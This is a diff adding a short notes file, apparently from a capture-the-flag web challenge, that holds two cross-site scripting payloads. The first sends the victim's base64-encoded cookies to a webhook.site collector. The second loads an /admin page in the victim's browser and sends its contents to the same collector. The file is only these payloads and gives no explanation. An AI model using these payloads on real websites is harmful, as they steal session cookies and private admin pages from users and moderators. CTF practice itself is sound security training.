@@ -1,0 +1,12 @@
+Message to Moderator (fail, HttpOnly cookie)
+	<script>fetch('https://webhook.site/a17c8ffe-10ee-4981-ab8b-11c41180b760/?c='+btoa(document.cookie))</script>
+
+<script>
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);
+    req.send(null);
+    url = "https://webhook.site/a17c8ffe-10ee-4981-ab8b-11c41180b760/?page=";
+    result = req.responseText;
+    url = url.concat(window.btoa(result));
+    fetch(url);
+</script>
